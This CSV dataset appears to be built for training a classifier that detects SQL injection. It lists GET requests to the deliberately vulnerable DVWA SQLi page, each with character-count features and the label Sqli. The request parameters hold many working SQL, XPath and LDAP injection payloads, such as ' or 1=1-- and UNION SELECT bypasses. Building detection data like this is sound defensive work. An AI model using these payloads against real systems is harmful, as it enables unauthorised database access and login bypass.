Method,Path,Body,Single Quotes,Double Quotes,Dashes,Braces,Spaces,Tags,Colons,Backtick,Bad Words,XSS Check,XSS Word,Cmdi Word,Cmdi Check,Class
GET,/DVWA/vulnerabilities/sqli/?id=admin%27or%201%3D1%20or%20%27%27%3D%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,0,3,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%20or%201%3D1&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%20or%201%3D1--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%20or%201%3D1%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%20or%201%3D1%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%29%20or%20%28%271%27%3D%271&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,1,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%29%20or%20%28%271%27%3D%271%27--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,1,1,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%29%20or%20%28%271%27%3D%271%27%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,0,1,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%29%20or%20%28%271%27%3D%271%27%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,0,1,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%29%20or%20%271%27%3D%271&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%29%20or%20%271%27%3D%271%27--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,1,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%29%20or%20%271%27%3D%271%27%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,0,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%29%20or%20%271%27%3D%271%27%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,0,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=1234%20%27%20AND%201%3D0%20UNION%20ALL%20SELECT%20%27admin%27%2C%20%2781dc9bdb52d04dc20036dbd8313ed055&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,0,8,0,0,0,3,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%20--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,0,1,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%20%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,1,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%20or%20%221%22%3D%221&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,4,0,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%20or%20%221%22%3D%221%22--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,1,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%20or%20%221%22%3D%221%22%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,0,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%20or%20%221%22%3D%221%22%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,0,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%22or%201%3D1%20or%20%22%22%3D%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,4,0,0,3,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%20or%201%3D1&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%20or%201%3D1--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%20or%201%3D1%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%20or%201%3D1%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%29%20or%20%28%221%22%3D%221&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,4,0,1,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%29%20or%20%28%221%22%3D%221%22--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,1,1,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%29%20or%20%28%221%22%3D%221%22%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,0,1,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%29%20or%20%28%221%22%3D%221%22%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,0,1,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%29%20or%20%221%22%3D%221&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,4,0,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%29%20or%20%221%22%3D%221%22--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,1,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%29%20or%20%221%22%3D%221%22%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,0,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%29%20or%20%221%22%3D%221%22%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,0,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=1234%20%22%20AND%201%3D0%20UNION%20ALL%20SELECT%20%22admin%22%2C%20%2281dc9bdb52d04dc20036dbd8313ed055&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,4,0,0,8,0,0,0,3,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%20%271%27%3D%271&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%20%27%27%3D%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%201%5D%2500&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%20%2f%2A%20or%20%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,0,4,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%20%22a%22%20or%20%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,2,0,0,4,0,0,0,1,0,1,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%201%20or%20%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,0,4,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%20true%28%29%20or%20%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,1,4,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27or%20string-length%28name%28%2e%29%29%3C10%20or%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,2,2,1,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27or%20contains%28name%2C%27adm%27%29%20or%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,1,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27or%20contains%28%2e%2C%27adm%27%29%20or%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,1,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27or%20position%28%29%3D2%20or%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,1,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%20or%20%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%20or%20%271%27%3D%272&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%2A%29%28%26&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,1,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%2A%29%28%7C%28%26&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,2,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=pwd%29&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%2A%29%28%7C%28%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,2,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%2A%29%29%2500&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%29%28%26%29&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,1,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=pwd&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%29%28%21%28%26%28%7C&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,3,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=pwd%29%29&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%29%29%28%7C%28%7C&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,2,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=1234&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27-%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,0,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%20%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,0,1,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%26%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,0,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%5E%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,0,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%2A%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,2,0,0,0,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%20%27%27-%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%20%27%27%20%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,0,3,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%20%27%27%26%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%20%27%27%5E%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%20%27%27%2A%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22-%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,0,0,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%20%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,0,0,1,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%26%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,0,0,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%5E%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,0,0,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%2A%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,2,0,0,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%20or%20%22%22-%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,4,0,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%20or%20%22%22%20%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,4,0,0,3,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%20or%20%22%22%26%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,4,0,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%20or%20%22%22%5E%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,4,0,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%20or%20%22%22%2A%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,4,0,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=or%20true--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,1,0,1,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%20or%20true--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%20true--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29%20or%20true--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29%20or%20true--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%20or%20%27x%27%3D%27x&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29%20or%20%28%27x%27%29%3D%28%27x&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,2,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%27%29%29%20or%20%28%28%27x%27%29%29%3D%28%28%27x&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,4,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%20or%20%22x%22%3D%22x&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,4,0,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29%20or%20%28%22x%22%29%3D%28%22x&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,4,0,2,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=%22%29%29%20or%20%28%28%22x%22%29%29%3D%28%28%22x&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,4,0,4,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=or%201%3D1&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,1,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=or%201%3D1--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,1,0,1,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=or%201%3D1%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,1,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=or%201%3D1%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,0,0,0,1,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%20--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,1,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%20%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,1,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%20or%20%271%27%3D%271&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%20or%20%271%27%3D%271%27--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,1,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%20or%20%271%27%3D%271%27%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,0,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%20or%20%271%27%3D%271%27%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,0,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%27or%201%3D1%20or%20%27%27%3D%27&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,0,3,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%20or%201%3D1&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%20or%201%3D1--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,1,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%20or%201%3D1%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%20or%201%3D1%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,1,0,0,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%29%20or%20%28%271%27%3D%271&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,1,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%29%20or%20%28%271%27%3D%271%27--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,1,1,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%29%20or%20%28%271%27%3D%271%27%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,0,1,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%29%20or%20%28%271%27%3D%271%27%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,0,1,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%29%20or%20%271%27%3D%271&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%29%20or%20%271%27%3D%271%27--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,1,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%29%20or%20%271%27%3D%271%27%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,0,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%27%29%20or%20%271%27%3D%271%27%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,5,0,0,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=1234%20%27%20AND%201%3D0%20UNION%20ALL%20SELECT%20%27admin%27%2C%20%2781dc9bdb52d04dc20036dbd8313ed055&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,0,8,0,0,0,3,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=1234%20%27%20AND%201%3D0%20UNION%20ALL%20SELECT%20%27admin%27%2C%20%277110eda4d09e062aa5e4a390b0a572ac0d2c0220&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,4,0,0,0,8,0,0,0,3,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%20--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,0,1,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%20%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,1,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,0,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%20or%20%221%22%3D%221&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,4,0,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%20or%20%221%22%3D%221%22--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,1,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%20or%20%221%22%3D%221%22%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,0,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%20or%20%221%22%3D%221%22%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,5,0,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%22or%201%3D1%20or%20%22%22%3D%22&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,4,0,0,3,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%20or%201%3D1&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%20or%201%3D1--&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,1,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%20or%201%3D1%23&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%20or%201%3D1%2f%2A&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,1,0,0,2,0,0,0,1,0,0,1,6,Sqli
GET,/DVWA/vulnerabilities/sqli/?id=admin%22%29%20or%20%28%221%22%3D%221&Submit=Submit&user_token=292d1352f25f810406bce3c7a667a499,,0,4,0,1,2,0,0,0,1,0,0,1,6,Sqli
